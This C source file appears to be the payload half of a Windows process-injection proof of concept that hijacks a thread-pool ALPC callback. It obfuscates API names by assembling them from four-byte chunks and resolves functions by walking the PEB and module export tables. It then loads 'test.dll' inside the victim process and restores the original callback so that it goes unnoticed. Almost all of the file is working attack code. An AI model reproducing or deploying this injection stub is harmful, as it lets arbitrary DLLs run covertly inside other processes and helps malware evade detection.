
#pragma runtime_checks("", off)

#include <nttpp.h>

#include <evntrace.h>
#include <pla.h>
#include <wbemidl.h>
#include <wmistr.h>
#include <Evntcons.h>

/*HMODULE LoadLibraryA(
  [in] LPCSTR lpLibFileName
);*/
/*
void OutputDebugStringA(
  [in, optional] LPCSTR lpOutputString
);
*/

typedef HMODULE(WINAPI *LoadLibraryA_t)(
    LPCSTR lpLibFileName);

typedef void(WINAPI *OutputDebugStringA_t)(LPCSTR lpOutputString);

typedef UINT(WINAPI *WinExec_t)(
    _In_ LPCSTR lpCmdLine, _In_ UINT uCmdShow);

LPVOID xGetProcAddress(LPVOID pszAPI);
int xstrcmp(char *, char *);

VOID TpAlpcCallBack(PTP_CALLBACK_INSTANCE Instance,
                    LPVOID Context, PTP_ALPC TpAlpc, LPVOID Reserved)
{
  WinExec_t pWinExec = NULL;
  LoadLibraryA_t pLoadLibraryA = NULL;
  OutputDebugStringA_t pOutputDebugStringA = NULL;

  DWORD szSampleMessage[1];

  DWORD szWinExec[2],
      szOutputDebugStringA[5],
      szLoadLibraryA[4],
      szMagicDll[3],
      szNotepad[1];

  PTP_ALPC_CALLBACK pLrpcIoComplete;
  TP_SIMPLE_CALLBACK *tp = (TP_SIMPLE_CALLBACK *)Context;
  // Context should contain pointer to original callback structure
  pLrpcIoComplete = (PTP_ALPC_CALLBACK)tp->Function;
  // restore original values
  // this will indicate we executed ok,
  // but is also required before the call to WinExec
  TpAlpc->CallbackObject.Callback.Function = tp->Function;
  TpAlpc->CallbackObject.Callback.Context = tp->Context;

  // construct LoadLibraryA string
  szLoadLibraryA[0] = *(DWORD *)"Load";
  szLoadLibraryA[1] = *(DWORD *)"Libr";
  szLoadLibraryA[2] = *(DWORD *)"aryA";
  szLoadLibraryA[3] = *(DWORD *)"\0\0\0\0";

  // construct szMagicDll string
  szMagicDll[0] = *(DWORD *)"test";
  szMagicDll[1] = *(DWORD *)".dll";
  szMagicDll[2] = *(DWORD *)"\0\0\0\0";

  // construct szOutputDebugStringA string
  szOutputDebugStringA[0] = *(DWORD *)"Outp";
  szOutputDebugStringA[1] = *(DWORD *)"utDe";
  szOutputDebugStringA[2] = *(DWORD *)"bugS";
  szOutputDebugStringA[3] = *(DWORD *)"trin";
  szOutputDebugStringA[4] = *(DWORD *)"gA\0\0";

//  pWinExec = (WinExec_t)xGetProcAddress(szWinExec);
 pLoadLibraryA = (LoadLibraryA_t)xGetProcAddress(szLoadLibraryA);
  pOutputDebugStringA = (OutputDebugStringA_t)(xGetProcAddress(szOutputDebugStringA));
  
  if (pOutputDebugStringA != NULL)
  {
     szSampleMessage[0] = *(DWORD *)"BEF\0";
    if (pLoadLibraryA == NULL)
    {
      szSampleMessage[0] = *(DWORD *)"RAU\0";
      pOutputDebugStringA((LPCSTR)szSampleMessage);
    }
    else
    {
      szSampleMessage[0] = *(DWORD *)"BUN\0";
      pLoadLibraryA((LPCSTR)szMagicDll);
      pOutputDebugStringA((LPCSTR)szSampleMessage);
    }
  }
  // if this is ALPC, pass the original message on..

  pLrpcIoComplete(Instance, TpAlpc->CallbackObject.Callback.Context, TpAlpc, Reserved);
}

#define RVA2VA(type, base, rva) (type)((ULONG_PTR)base + rva)

// locate address of API in export table
LPVOID FindExport(LPVOID base, PCHAR pszAPI)
{
  PIMAGE_DOS_HEADER dos;
  PIMAGE_NT_HEADERS nt;
  DWORD cnt, rva, dll_h;
  PIMAGE_DATA_DIRECTORY dir;
  PIMAGE_EXPORT_DIRECTORY exp;
  PDWORD adr;
  PDWORD sym;
  PWORD ord;
  PCHAR api, dll;
  LPVOID api_adr = NULL;

  dos = (PIMAGE_DOS_HEADER)base;
  nt = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
  dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
  rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

  // if no export table, return NULL
  if (rva == 0)
    return NULL;

  exp = (PIMAGE_EXPORT_DIRECTORY)RVA2VA(ULONG_PTR, base, rva);
  cnt = exp->NumberOfNames;

  // if no api names, return NULL
  if (cnt == 0)
    return NULL;

  adr = RVA2VA(PDWORD, base, exp->AddressOfFunctions);
  sym = RVA2VA(PDWORD, base, exp->AddressOfNames);
  ord = RVA2VA(PWORD, base, exp->AddressOfNameOrdinals);
  dll = RVA2VA(PCHAR, base, exp->Name);

  do
  {
    // calculate hash of api string
    api = RVA2VA(PCHAR, base, sym[cnt - 1]);
    // add to DLL hash and compare
    if (!xstrcmp(pszAPI, api))
    {
      // return address of function
      api_adr = RVA2VA(LPVOID, base, adr[ord[cnt - 1]]);
      return api_adr;
    }
  } while (--cnt && api_adr == 0);
  return api_adr;
}

#ifndef _MSC_VER
#ifdef __i386__
/* for x86 only */
unsigned long __readfsdword(unsigned long Offset)
{
  unsigned long ret;
  __asm__ volatile("movl  %%fs:%1,%0"
                   : "=r"(ret), "=m"((*(volatile long *)Offset)));
  return ret;
}
#else
/* for __x86_64 only */
unsigned __int64 __readgsqword(unsigned long Offset)
{
  void *ret;
  __asm__ volatile("movq  %%gs:%1,%0"
                   : "=r"(ret), "=m"((*(volatile long *)(unsigned __int64)Offset)));
  return (unsigned __int64)ret;
}
#endif
#endif

// search all modules in the PEB for API
LPVOID xGetProcAddress(LPVOID pszAPI)
{
  PPEB peb;
  PPEB_LDR_DATA ldr;
  PLDR_DATA_TABLE_ENTRY dte;
  LPVOID api_adr = NULL;

#if defined(_WIN64)
  peb = (PPEB)__readgsqword(0x60);
#else
  peb = (PPEB)__readfsdword(0x30);
#endif

  ldr = (PPEB_LDR_DATA)peb->Ldr;

  // for each DLL loaded
  for (dte = (PLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink;
       dte->DllBase != NULL && api_adr == NULL;
       dte = (PLDR_DATA_TABLE_ENTRY)dte->InLoadOrderLinks.Flink)
  {
    // search the export table for api
    api_adr = FindExport(dte->DllBase, (PCHAR)pszAPI);
  }
  return api_adr;
}

// same as strcmp
int xstrcmp(char *s1, char *s2)
{
  while (*s1 && (*s1 == *s2))
    s1++, s2++;
  return (int)*(unsigned char *)s1 - *(unsigned char *)s2;
}